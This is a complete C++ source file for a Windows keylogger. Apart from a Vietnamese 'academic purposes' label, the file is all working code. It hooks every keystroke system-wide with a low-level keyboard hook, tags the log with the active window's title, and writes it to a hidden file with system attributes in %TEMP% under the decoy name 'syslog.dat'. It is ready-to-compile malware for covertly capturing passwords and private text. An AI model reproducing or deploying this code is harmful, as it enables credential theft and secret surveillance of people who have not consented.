// keylogger_sample.cpp
// MUC DICH HOC THUAT 
#include <windows.h>
#include <stdio.h>
#include <time.h>

#define LOG_FILE "%TEMP%\\syslog.dat"

HHOOK   g_hKeyboardHook = NULL;   // Handle toi keyboard hook
HANDLE  g_hLogFile       = NULL;   // Handle toi file log
HWND    g_hLastWindow    = NULL;   // Cua so active truoc do

void GetLogFilePath(LPSTR lpszPath, DWORD dwSize) {
    char szTemp[MAX_PATH];
    GetTempPathA(MAX_PATH, szTemp);          // %TEMP%
    lstrcpynA(lpszPath, szTemp, dwSize);
    lstrcatA(lpszPath, "syslog.dat");
}


void WriteLog(LPCSTR lpszText) {
    if (g_hLogFile == INVALID_HANDLE_VALUE || g_hLogFile == NULL)
        return;
    DWORD dwWritten;
    WriteFile(g_hLogFile,                    // Handle file
              lpszText,                      // Du lieu ghi
              (DWORD)lstrlenA(lpszText),     // So byte
              &dwWritten,                    // So byte da ghi
              NULL);                         // Khong dung overlapped I/O
}


void LogWindowContext() {
    HWND hForeground = GetForegroundWindow();
    if (hForeground == g_hLastWindow) return;  // Khong thay doi
    g_hLastWindow = hForeground;

    char szTitle[256] = {0};
    GetWindowTextA(hForeground, szTitle, sizeof(szTitle));

    char szBuf[512];
    wsprintfA(szBuf, "\n\n[Window: %s]\n", szTitle);
    WriteLog(szBuf);
}


LRESULT CALLBACK LowLevelKeyboardProc(
    int    nCode,
    WPARAM wParam,
    LPARAM lParam)
{
    // Neu nCode < 0: khong xu ly, chuyen tiep ngay
    if (nCode < 0)
        return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);

    // Chi xu ly khi phim duoc nhan xuong
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKbd->vkCode;  // Virtual Key Code

        LogWindowContext();  // Cap nhat context cua so

        char szKey[64] = {0};


        switch (vkCode) {
            case VK_RETURN:  lstrcpyA(szKey, "[ENTER]\n"); break;
            case VK_BACK:    lstrcpyA(szKey, "[BACKSPACE]"); break;
            case VK_TAB:     lstrcpyA(szKey, "[TAB]"); break;
            case VK_DELETE:  lstrcpyA(szKey, "[DEL]"); break;
            case VK_ESCAPE:  lstrcpyA(szKey, "[ESC]"); break;
            case VK_SPACE:   lstrcpyA(szKey, " "); break;
            case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
                             lstrcpyA(szKey, "[SHIFT]"); break;
            case VK_CONTROL: lstrcpyA(szKey, "[CTRL]"); break;
            case VK_MENU:    lstrcpyA(szKey, "[ALT]"); break;
            case VK_CAPITAL: lstrcpyA(szKey, "[CAPSLOCK]"); break;
            default: {
            
                BYTE keyState[256];
                GetKeyboardState(keyState);  // Lay trang thai tat ca phim

                WCHAR wchBuf[4] = {0};
                int nResult = ToUnicode(
                    vkCode,              // Virtual key code
                    pKbd->scanCode,      // Scan code
                    keyState,            // Trang thai keyboard
                    wchBuf,              // Output buffer
                    3,                   // Max chars
                    0                    // Flags
                );

                if (nResult > 0) {
                    // Convert Unicode -> ANSI de ghi file
                    WideCharToMultiByte(CP_ACP, 0, wchBuf, nResult,
                                        szKey, sizeof(szKey), NULL, NULL);
                }
                break;
            }
        }

        if (szKey[0] != '\0')
            WriteLog(szKey);  // Ghi keystroke vao file
    }


    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}


int WINAPI WinMain(
    HINSTANCE hInstance, HINSTANCE, LPSTR, int)
{

    char szLogPath[MAX_PATH];
    GetLogFilePath(szLogPath, MAX_PATH);

    g_hLogFile = CreateFileA(
        szLogPath,
        GENERIC_WRITE,               // Quyen ghi
        FILE_SHARE_READ,             // Cho phep doc dong thoi
        NULL,                        // Default security
        OPEN_ALWAYS,                 // Tao moi hoac mo file cu
        FILE_ATTRIBUTE_HIDDEN |      // An file
        FILE_ATTRIBUTE_SYSTEM,       // Danh dau la file he thong
        NULL
    );


    SetFilePointer(g_hLogFile, 0, NULL, FILE_END);


    char szTs[128];
    SYSTEMTIME st; GetLocalTime(&st);
    wsprintfA(szTs, "\n=== SESSION START %02d/%02d/%04d %02d:%02d:%02d ===\n",
              st.wDay, st.wMonth, st.wYear,
              st.wHour, st.wMinute, st.wSecond);
    WriteLog(szTs);


    g_hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,            // Loai hook: Low-Level Keyboard
        LowLevelKeyboardProc,      // Dia chi ham callback
        hInstance,                 // Instance cua module nay
        0                          // 0 = hook toan he thong (tat ca thread)
    );

    if (g_hKeyboardHook == NULL) {
        CloseHandle(g_hLogFile);
        return 1;  // Loi: khong cai hook duoc
    }


    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // --- Cleanup ---
    UnhookWindowsHookEx(g_hKeyboardHook);
    CloseHandle(g_hLogFile);
    return 0;
}
